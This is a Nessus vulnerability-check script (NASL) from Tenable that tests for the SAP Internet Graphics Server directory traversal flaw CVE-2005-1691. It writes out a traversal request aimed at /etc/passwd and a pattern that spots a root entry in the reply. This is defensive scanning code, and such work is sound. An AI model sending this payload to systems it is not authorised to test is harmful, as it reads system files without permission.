#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(19298);
  script_version("$Revision: 1.16 $");
  script_cvs_date("$Date: 2016/11/02 14:37:09 $");

  script_cve_id("CVE-2005-1691");
  script_bugtraq_id(14369);
  script_osvdb_id(18255);

  script_name(english:"SAP Internet Graphics Server (IGS) Directory Traversal Vulnerability");
  script_summary(english:"Attempts to read /etc/passwd.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a directory traversal
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of SAP Internet Graphics Server (IGS) installed on the
remote host is affected by a directory traversal vulnerability. An
unauthenticated, remote attacker can exploit this, via a specially
crafted HTTP GET request, to access arbitrary files on the remote host
with the privileges of the web server process.");
  # http://web.archive.org/web/20061018032723/http://www.corsaire.com/advisories/c050503-001.txt
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?d1abf66b");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2005/Jul/411");
  script_set_attribute(attribute:"solution", value:
"Upgrade to SAP IGS version 6.40 Patch 11 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2005/07/25");
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/07/25");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:sap:sap_r_3");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}

#
# The script code starts here
#
include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
app = "SAP Internet Graphics Server (IGS)";

r = http_send_recv3(
  method : "GET",
  port   : port,
  item   : "/",
  exit_on_fail : TRUE
);

if (!ereg(pattern:"SAP IGS is running", string:r[2], icase:TRUE, multiline:TRUE))
  audit(AUDIT_WEB_APP_NOT_INST, app, port);

url = "/htdocs/../../../../../../../../../../../../../etc/passwd";
r = http_send_recv3(
  method : "GET",
  item   : url,
  port   : port,
  exit_on_fail : TRUE
);
res = r[2];

passwd = egrep(pattern:"root:.*:0:[01]:", string:res);

if (!empty_or_null(passwd))
{
  security_report_v4(
    port        : port,
    severity    : SECURITY_WARNING,
    file        : "/etc/passwd",
    request     : make_list(build_url(qs:url, port:port)),
    output      : chomp(res[2]),
    attach_type : 'text/plain'
  );
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, build_url(qs:"/", port:port));
